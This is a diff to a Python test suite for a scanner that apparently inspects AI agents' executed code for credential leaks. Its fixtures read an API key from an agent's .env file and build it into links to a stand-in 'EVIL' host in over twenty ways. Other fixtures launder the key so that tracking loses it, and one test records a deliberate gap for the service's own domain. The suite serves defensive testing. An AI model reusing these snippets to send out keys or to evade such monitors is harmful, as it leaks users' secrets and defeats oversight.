@@ -22,7 +22,8 @@ from test_session_sets import seed
 
 from sentrook.converge import load_params
 from sentrook.prepare import credential_home, entities
-from sentrook.prepare.code_reach import CodeReach, plain_mentions, python_reach
+from sentrook.prepare.code_reach import CodeReach, python_reach
+from sentrook.prepare.credential_home import same_service
 from sentrook.prepare.entities import EntityKind, Origin, Role
 from sentrook.scan import Scanner, ScannerConfig, ScanOptions
 
@@ -563,169 +564,44 @@ def test_import_of_two_urllib_modules_is_one_package():
     assert python_reach(rebound).targets is None
 
 
-# ------------------------------------------------------------------ the plain-program gate
+# ------------------------------------------------------------------ the key put into a link
 
-#: The key put into a link the body carries: a site that shows the link (an unfurler) fetches it.
-KEY_IN_LINK = {
-    "concatenated": f"'https://{APP}/c?k=' + key",
-    "percent": f"'https://{APP}/c?k=%s' % key",
-    "f-string": f"f'https://{APP}/c?k={{key}}'",
-    "format": f"'https://{APP}/c?k={{}}'.format(key)",
-    "joined": f"''.join(['https://{APP}/c?k=', key])",
-    "urljoin": f"urllib.parse.urljoin('https://{APP}/c', '?k=' + key)",
-    "re.sub": f"re.sub('KEY', key, 'https://{APP}/c?k=KEY')",
-    "userinfo before a bare host": f"'https://' + key + '@{APP}/c'",
-    "through a name": "(L + key)",
-    "a list grown then joined": "''.join(parts)",
-    "added in place": "(link)",
-    "a whole link edited": "L.replace(' now', key)",
-    "a whole link sliced": "L2[:-2] + key",
-    "a bytearray extended": "ba.decode()",
-    "a list with the key inserted": "''.join(ps)",
-    "percent with a mapping": f"'%(u)s%(k)s' % {{'u': 'https://{APP}/c?k=', 'k': key}}",
-}
-_SETUP = {
-    "through a name": f"L = 'https://{APP}/c?k='\n",
-    "a list grown then joined": f"parts = ['https://{APP}/c?k=']\nparts.append(key)\n",
-    "added in place": f"link = 'https://{APP}/c?k='\nlink += key\n",
-    "a whole link edited": f"L = 'https://{APP}/c?k= now'\n",
-    "a whole link sliced": f"L2 = 'https://{APP}/c?k= x'\n",
-    "a bytearray extended": f"ba = bytearray(b'https://{APP}/c?k=')\nba.extend(key.encode())\n",
-    "a list with the key inserted": f"ps = ['https://{APP}/c?k=']\nps.insert(1, key)\n",
-}
-
-
-def _with_link(expr: str, setup: str = "") -> str:
-    return (
-        READ_KEY.replace("import os, json", "import os, re, json, urllib.parse")
-        + REQ_HEAD
-        + REQ_BODY.format(url=f"'https://{API}/v1/' + p")
-        + setup
-        + f"req('pages', {{'children': [{{'text': {expr}}}]}}, 'POST')\n"
-    )
-
-
-@pytest.mark.parametrize("name", KEY_IN_LINK, ids=KEY_IN_LINK.keys())
-def test_the_key_built_into_a_link_keeps_the_floor(name):
-    code = _with_link(KEY_IN_LINK[name], _SETUP.get(name, ""))
-    assert python_reach(code) == CodeReach(network=True, targets=frozenset({API}))
-    assert not plain_mentions(code, frozenset({APP}))
-    assert_floor_holds(code)
-
-
-def test_a_reply_put_together_with_the_key_keeps_the_floor():
-    """The server echoes the link back and the program adds the key to it."""
-    code = _with_link(
-        "echo['t'] + key", f"echo = req('pages', {{'t': 'https://{APP}/c?k='}}, 'POST')\n"
-    )
-    assert not plain_mentions(code, frozenset({APP}))
-    assert_floor_holds(code)
-
-
-def test_a_whole_link_put_into_a_longer_text_is_plain():
-    """A link written whole (its URL ends inside the literal) may sit in a body built with other values."""
-    code = (
-        READ_KEY
-        + REQ_HEAD
-        + REQ_BODY.format(url=f"'https://{API}/v1/' + p")
-        + f"RL = '[docs](https://{APP}/p/123)'\n"
-        + "ds = req('databases/abc')['id']\n"
-        + "body = f'See {RL} for {ds}.\\n' + 'More text.'\n"
-        + "req('pages', {'parent': ds, 'children': [{'text': body}]}, 'POST')\n"
-        + "if __name__ == '__main__':\n    print('done')\n"
-    )
-    assert plain_mentions(code, frozenset({APP}))
-    res = _scan(code, "conv-v7")
-    assert res.prepared.credential_home_check == "ok"
-    assert "sensitive_data_sent" not in floors(res)
-
-
-#: One change to the helper each, keeping its targets known, that the plain-program gate refuses.
-NOT_PLAIN = {
-    "an import off the list": ("import os, json", "import os, json, base64"),
-    "a lambda": ("ds = req(", "strip = lambda s: s.strip()\nds = req("),
-    "a dunder name": ("ds = req(", "print(__name__)\nds = req("),
-    "a decorated def": ("def req(", "def keep(f):\n    return f\n@keep\ndef req("),
-    "a global statement": ("    r = urllib", "    global key\n    r = urllib"),
-    "a request keyword off the list": ("urlopen(r)", "urlopen(r, context=None)"),
-    "a banned builtin": ("ds = req(", "o = object()\nds = req("),
-}
-
-
-@pytest.mark.parametrize("change", NOT_PLAIN.values(), ids=NOT_PLAIN.keys())
-def test_a_program_that_is_not_plain_keeps_the_floor(change):
-    code = HELPER.replace(*change)
-    assert code != HELPER
-    assert python_reach(code) == CodeReach(network=True, targets=frozenset({API}))
-    assert not plain_mentions(code, frozenset({APP}))
-    assert_floor_holds(code)
-
-
-def test_the_plain_helper_passes_the_gate():
-    assert plain_mentions(HELPER, frozenset({APP}))
-
-
-def test_the_plain_gate_grows_linearly():
-    """Many requests carrying links and many strings put together (see linear_time.py)."""
-    head = READ_KEY + REQ_HEAD + REQ_BODY.format(url=f"'https://{API}/v1/' + p")
-    unit = (
-        "t{i} = 'row ' + str({i}) + ' of ' + str({i} * 2)\n"
-        "req('pages', {{'text': t{i} + ' see https://" + APP + "/p/{i} now'}}, 'POST')\n"
-    )
-    texts = {d: head + "".join(unit.format(i=i) for i in range(1200 // d)) for d in (1, FACTOR)}
-    assert plain_mentions(texts[FACTOR], frozenset({APP}))
-    _, large = assert_linear(lambda d: plain_mentions(texts[d], frozenset({APP})), unit)
-    assert large < 3.0
-
-
-# ------------------------------------------------------------------ links filled in or laundered (round three)
-
-#: The key read through a name for the env file path, so the credential is not followed: the link's own
-#: shape must keep the floor.
+#: The key read through a name for the env file path, so nothing follows the credential: only the link's
+#: domain keeps the floor.
 UNTRACKED_KEY = (
-    "import os, sys, json, urllib.request\n"
+    "import os, re, sys, json, urllib.request, urllib.parse\n"
     "ENVP = os.path.expanduser('~/.agent/.env')\n"
     "key = [l.split('=',1)[1].strip() for l in open(ENVP) if l.startswith('SERVICE_API_KEY=')][0]\n"
 )
-#: Ways the key reaches the link: each is a template, a rewrite or a value read back from somewhere.
-FILLED = {
-    "a percent template": f"'https://{APP}/c?k=%s now' % key",
-    "a format template in a markdown link": f"'[docs](https://{APP}/c?k={{}})'.format(key)",
-    "a format_map template": f"'see https://{APP}/c?k={{k}} now'.format_map({{'k': key}})",
-    "an f-string placeholder in the link": f"f'see https://{APP}/c?k={{key}} now'",
-    "a replace in a closed link": f"'see https://{APP}/c?k=XX now'.replace('XX', key)",
-    "a closed link stripped": f"'see https://{APP}/c?k= '.strip() + key",
-    "a closed link sliced": f"'see https://{APP}/c?k= now'[:-4] + key",
-    "a closed link cut by a format width": "f'{L5:.22}' + key",
-    "a link closed by a bar": f"'see https://{APP}/c?k=|' + key",
-    "a link closed by an angle bracket": f"'<https://{APP}/c?k=>' + key",
-    "a link closed by a bare paren": f"'(https://{APP}/c?k=)' + key",
-    "a link closed by a quote": f"'\"https://{APP}/c?k=\"' + key",
+#: Ways the key reaches a link to another domain, built, filled in, rewritten or read back.
+KEY_IN_LINK = {
+    "concatenated": f"'https://{EVIL}/c?k=' + key",
+    "percent": f"'https://{EVIL}/c?k=%s now' % key",
+    "percent with a precision": f"'%.29s%s' % ('https://{EVIL}/c?k=', key)",
+    "percent repr": f"'see https://{EVIL}/c?k=%r' % key",
+    "f-string": f"f'https://{EVIL}/c?k={{key}}'",
+    "format": f"'[docs](https://{EVIL}/c?k={{}})'.format(key)",
+    "format with a spec": f"'{{0:.29}}{{1}}'.format('https://{EVIL}/c?k= now', key)",
+    "format_map": f"'see https://{EVIL}/c?k={{k}} now'.format_map({{'k': key}})",
+    "joined": f"''.join(['https://{EVIL}/c?k=', key])",
+    "urljoin": f"urllib.parse.urljoin('https://{EVIL}/c', '?k=' + key)",
+    "re.sub": f"re.sub('KEY', key, 'https://{EVIL}/c?k=KEY')",
+    "replace in a closed link": f"'see https://{EVIL}/c?k=XX now'.replace('XX', key)",
+    "a closed link stripped": f"'see https://{EVIL}/c?k= '.strip() + key",
+    "a closed link sliced": f"'see https://{EVIL}/c?k= now'[:-4] + key",
+    "quoted after the join": f"urllib.parse.quote('https://{EVIL}/c?k=' + key)",
+    "a markdown angle target": f"'[d](<https://{EVIL}/c?k= ' + key + '>)'",
+    "an HTML href": f"'<a href=\"https://{EVIL}/c?k=' + key + '\">x</a>'",
+    "a whole-URL JSON field": f"json.dumps({{'url': 'https://{EVIL}/c?k=' + key}})",
+    "userinfo before a bare host": f"'https://' + key + '@{EVIL}/c'",
+    "a list grown then joined": "''.join(parts)",
+    "added in place": "(link)",
 }
-_FILLED_SETUP = {
-    "a closed link cut by a format width": f"L5 = 'see https://{APP}/c?k= now'\n",
+_SETUP = {
+    "a list grown then joined": f"parts = ['https://{EVIL}/c?k=']\nparts.append(key)\n",
+    "added in place": f"link = 'https://{EVIL}/c?k='\nlink += key\n",
 }
-
-
-def _untracked(expr: str, setup: str = "") -> str:
-    return (
-        UNTRACKED_KEY
-        + REQ_HEAD
-        + REQ_BODY.format(url=f"'https://{API}/v1/' + p")
-        + setup
-        + f"req('pages', {{'children': [{{'text': {expr}}}]}}, 'POST')\n"
-    )
-
-
-@pytest.mark.parametrize("name", FILLED, ids=FILLED.keys())
-def test_a_link_filled_with_a_value_keeps_the_floor(name):
-    code = _untracked(FILLED[name], _FILLED_SETUP.get(name, ""))
-    assert python_reach(code) == CodeReach(network=True, targets=frozenset({API}))
-    assert not plain_mentions(code, frozenset({APP}))
-    assert_floor_holds(code)
-
-
-#: The key laundered so key tracking loses it, then put into an open link.
+#: The key laundered on its way, so a reading that follows it would lose it.
 LAUNDERED = {
     "a helper reading the env file": (
         "def load():\n    return [l.split('=',1)[1].strip() for l in open(os.path.expanduser(ENVP))"
@@ -737,82 +613,149 @@ LAUNDERED = {
     ),
     "sys.argv": "sys.argv.append(key)\nk2 = sys.argv[-1]\n",
     "the API's reply": "k2 = req('echo', {'v': key}, 'POST')['v']\n",
+    "a find on a literal": "k2 = ''.join(c for c in key if 'abcdefghijklmnopqrstuvwxyz0123456789_-'.find(c) >= 0)\n",
 }
 
 
-@pytest.mark.parametrize("setup", LAUNDERED.values(), ids=LAUNDERED.keys())
-def test_a_laundered_key_in_an_open_link_keeps_the_floor(setup):
-    code = _untracked(f"'see https://{APP}/c?k=%s now' % k2", setup)
-    reach = python_reach(code)
-    assert reach is not None and reach.targets in (None, frozenset({API}))
-    assert not plain_mentions(code, frozenset({APP}))
+def _body(expr: str, setup: str = "", head: str = UNTRACKED_KEY) -> str:
+    return (
+        head
+        + REQ_HEAD
+        + REQ_BODY.format(url=f"'https://{API}/v1/' + p")
+        + setup
+        + f"req('pages', {{'children': [{{'text': {expr}}}]}}, 'POST')\n"
+    )
+
+
+@pytest.mark.parametrize("name", KEY_IN_LINK, ids=KEY_IN_LINK.keys())
+def test_the_key_put_into_a_link_to_another_domain_keeps_the_floor(name):
+    code = _body(KEY_IN_LINK[name], _SETUP.get(name, ""))
+    assert python_reach(code) == CodeReach(network=True, targets=frozenset({API}))
     assert_floor_holds(code)
 
 
-#: A value naming a mentioned host sent somewhere it could come back from unseen.
-SENT_AWAY = {
-    "kept in module state": "sys.argv.append(RL)\n",
-    "raised": "def f():\n    raise ValueError(RL)\n",
-    "written to a file": "open('/tmp/scratch/link.txt', 'w').write(RL)\n",
-    "given to a builtin that keeps it": "next(iter([RL]))\nsetvalue = sorted([RL])\nsys.path.insert(0, RL)\n",
-}
+@pytest.mark.parametrize("setup", LAUNDERED.values(), ids=LAUNDERED.keys())
+def test_a_laundered_key_in_a_link_to_another_domain_keeps_the_floor(setup):
+    assert_floor_holds(_body(f"'see https://{EVIL}/c?k=%s now' % k2", setup))
 
 
-@pytest.mark.parametrize("setup", SENT_AWAY.values(), ids=SENT_AWAY.keys())
-def test_a_link_sent_where_it_could_come_back_is_not_plain(setup):
-    code = _untracked("RL", f"RL = '[docs](https://{APP}/p/1)'\n" + setup)
-    assert not plain_mentions(code, frozenset({APP}))
+def test_a_link_on_the_service_domain_built_with_values_is_skipped():
+    """A link on the key's own service domain reaches only the service that already receives the key."""
+    code = _body(
+        f"'[docs](https://{APP}/p/' + ds + ')'",
+        f"RL = '[docs](https://{APP}/p/1)'\nds = req('databases/abc')['id']\n",
+    )
+    res = _scan(code, "conv-v7")
+    assert res.prepared.credential_home_check == "ok"
+    assert "sensitive_data_sent" not in floors(res)
 
 
-#: A template whose link is closed before the placeholder, filled with a computed value that is not the key.
-CLOSED_TEMPLATES = {
-    "a markdown link, then a format field": f"'[docs](https://{APP}/p/1) for {{}}'.format(ds)",
-    "a link closed by a space, then percent": f"'see https://{APP}/p/1 for %s' % ds",
-    "an f-string after a markdown link": f"f'[docs](https://{APP}/p/1) for {{ds}}'",
-    "a markdown link name in an f-string": "f'{RL} for {ds}'",
-}
-#: The same with the placeholder inside the link.
-OPEN_TEMPLATES = {
-    "a format field in the link": f"'[docs](https://{APP}/p/{{}})'.format(ds)",
-    "percent in the link": f"'see https://{APP}/p/%s now' % ds",
-    "an f-string field in the link": f"f'see https://{APP}/p/{{ds}} now'",
-}
+# ------------------------------------------------------------------ the service's own domain
+
+#: (the key's listed host, the host a link in the body names, skipped as the same service)
+DOMAINS = [
+    ("api.example.com", "app.example.com", True),
+    ("api.example.com", "example.com", True),
+    ("api.example.com", "docs.eu.example.com", True),
+    ("api.example.com", "APP.Example.COM.", True),
+    ("api.example.co.uk", "app.example.co.uk", True),
+    ("api.example.com", "evil-example.com", False),
+    ("api.example.com", "example.com.evil.net", False),
+    ("api.example.com", "api.example.com.evil.net", False),
+    ("api.example.com", "example.net", False),
+    ("api.example.com", "xn--exmple-cua.com", False),
+    ("api.example.com", "app.xn--exmple-cua.com", False),
+    ("api.example.co.uk", "other.co.uk", False),
+    ("api.github.com", "someone.github.io", False),
+    ("someone.github.io", "other.github.io", False),
+    ("api.example.herokuapp.com", "evil.herokuapp.com", False),
+    ("bucket.s3.amazonaws.com", "evil.s3.amazonaws.com", False),
+    ("api.example.notion.site", "evil.notion.site", False),
+    ("api.example.com", "192.0.2.10", False),
+    ("10.0.0.1", "10.0.0.2", False),
+]
 
 
-@pytest.mark.parametrize("expr", CLOSED_TEMPLATES.values(), ids=CLOSED_TEMPLATES.keys())
-def test_a_value_filled_after_a_closed_link_is_plain(expr):
-    setup = f"RL = '[docs](https://{APP}/p/1)'\nds = req('databases/abc')['id']\n"
-    assert plain_mentions(_untracked(expr, setup), frozenset({APP}))
+@pytest.mark.parametrize(("home", "mention", "same"), DOMAINS)
+def test_same_service_is_the_registrable_domain_only(home, mention, same):
+    assert same_service(mention, home) is same
 
 
-@pytest.mark.parametrize("expr", OPEN_TEMPLATES.values(), ids=OPEN_TEMPLATES.keys())
-def test_a_value_filled_inside_a_link_is_not_plain(expr):
-    setup = "ds = req('databases/abc')['id']\n"
-    assert not plain_mentions(_untracked(expr, setup), frozenset({APP}))
+@pytest.mark.parametrize(
+    ("mention", "skipped"),
+    [
+        (APP, True),
+        ("docs.example.com", True),
+        (EVIL, False),
+        ("evil-example.com", False),
+        ("example.com.evil.net", False),
+        ("api.example.com.evil.net", False),
+        ("xn--exmple-cua.com", False),
+    ],
+)
+def test_a_link_in_the_body_is_skipped_only_on_the_service_domain(mention, skipped):
+    code = helper(calls=CALLS.replace(APP, mention))
+    assert python_reach(code) == CodeReach(network=True, targets=frozenset({API}))
+    res = _scan(code, "conv-v7")
+    if skipped:
+        assert res.prepared.credential_home_check == "ok"
+        assert "sensitive_data_sent" not in floors(res)
+    else:
+        assert res.prepared.credential_home is None
+        assert "sensitive_data_sent" in floors(res)
 
 
-def test_an_unpacked_call_grows_linearly():
+def test_a_link_to_a_shared_host_is_not_the_service_of_a_key_listed_on_it():
+    """`api.github.com` lists the key: `someone.github.io` is a stranger's site, not that service."""
+    home = {**HOME, "value": "api.github.com"}
+    code = helper(
+        url="'https://api.github.com/v1/' + p", calls=CALLS.replace(APP, "someone.github.io")
+    )
+    raw = planir("execute_code", "exec", {"code": code}, platform="hermes", request=REQUEST)
+    scanner = Scanner(
+        ScannerConfig(
+            token_key=KEY, decider=FakeDecider(BENIGN_ANSWERS), params=load_params("conv-v7")
+        )
+    )
+    res = scanner.scan(
+        raw,
+        ScanOptions(
+            deterministic=True,
+            clock=CLOCK,
+            salt="testnest",
+            state_seed=HELD,
+            oracle_seed={"entities": [home]},
+        ),
+    )
+    assert res.prepared.credential_home is None
+    assert "sensitive_data_sent" in floors(res)
+
+
+# ------------------------------------------------------------------ reading time
+
+
+def test_an_unpacked_call_reads_linearly():
     """A call that unpacks its arguments into a function of many parameters (see linear_time.py)."""
 
     def program(d: int) -> str:
-        params = ", ".join(f"p{i}" for i in range(8000 // d))
+        params = ", ".join(f"p{i}=''" for i in range(8000 // d))
         return (
             HELPER
             + f"def wide({params}):\n    return p0\n"
-            + f"x = ['[d](https://{APP}/p/1)'] * 3\n"
-            + "print(wide(*x, 'tail'))\n"
+            + "x = ['a'] * 3\n"
+            + "".join("print(wide(*x, 'tail'))\n" for _ in range(2000 // d))
         )
 
     texts = {d: program(d) for d in (1, FACTOR)}
-    assert plain_mentions(texts[1], frozenset({APP}))
-    _, large = assert_linear(lambda d: plain_mentions(texts[d], frozenset({APP})), "wide call")
+    assert python_reach(texts[1]).targets == frozenset({API})
+    _, large = assert_linear(lambda d: python_reach(texts[d]), "wide call")
     assert large < 3.0
 
 
-def test_deeply_nested_helper_calls_grow_linearly():
+def test_deeply_nested_helper_calls_read_linearly():
     """Helper calls nested 180 deep, many of them (see linear_time.py)."""
     depth = 180
-    unit = "y{i} = " + "h(" * depth + f"'[d](https://{APP}/p/{{i}})'" + ")" * depth + "\n"
+    unit = "y{i} = " + "h(" * depth + "'x{i}'" + ")" * depth + "\n"
 
     def program(d: int) -> str:
         return (
@@ -823,6 +766,13 @@ def test_deeply_nested_helper_calls_grow_linearly():
 
     texts = {d: program(d) for d in (1, FACTOR)}
     assert len(texts[1]) > 150_000
-    assert plain_mentions(texts[1], frozenset({APP}))
-    _, large = assert_linear(lambda d: plain_mentions(texts[d], frozenset({APP})), "nested calls")
+    assert python_reach(texts[1]).targets == frozenset({API})
+    _, large = assert_linear(lambda d: python_reach(texts[d]), "nested calls")
     assert large < 5.0
+
+
+def test_the_key_in_a_link_on_the_service_domain_is_skipped_by_design():
+    """The service already receives the key with every request: a link to its own domain built with the
+    key reaches nobody new. This is the rule's trade, not an oversight."""
+    res = _scan(_body(f"'https://{APP}/c?k=' + key"), "conv-v7")
+    assert res.prepared.credential_home_check == "ok"
